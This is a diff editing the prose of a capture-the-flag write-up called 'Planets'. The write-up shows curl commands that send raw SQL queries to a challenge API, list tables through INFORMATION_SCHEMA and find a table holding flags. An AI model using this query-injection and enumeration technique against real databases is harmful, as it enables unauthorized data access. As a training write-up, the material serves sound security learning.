@@ -1,6 +1,6 @@
 # Planets
 
-Open the website <https://planets.ctf.zone/>, found the following api endpoint:
+Open the website <https://planets.ctf.zone/> and discover the following API endpoint:
 
 ```shell
 curl 'https://planets.ctf.zone/api.php' \
@@ -12,8 +12,7 @@ curl 'https://planets.ctf.zone/api.php' \
   --data-raw 'query=SELECT * FROM planets'
 ```
 
-Find all tables using INFORMATION_SCHEMA.TABLES:
-
+Find all tables using `INFORMATION_SCHEMA.TABLES`:
 
 ```shell
 curl 'https://planets.ctf.zone/api.php' \
@@ -25,7 +24,7 @@ curl 'https://planets.ctf.zone/api.php' \
   --data-raw 'query=SELECT * FROM INFORMATION_SCHEMA.TABLES'
 ```
 
-Found a table named abandoned_planets, find its rows with flags in them:
+We find a table named `abandoned_planets`. Query its rows to find flags:
 
 ```shell
 curl 'https://planets.ctf.zone/api.php' \
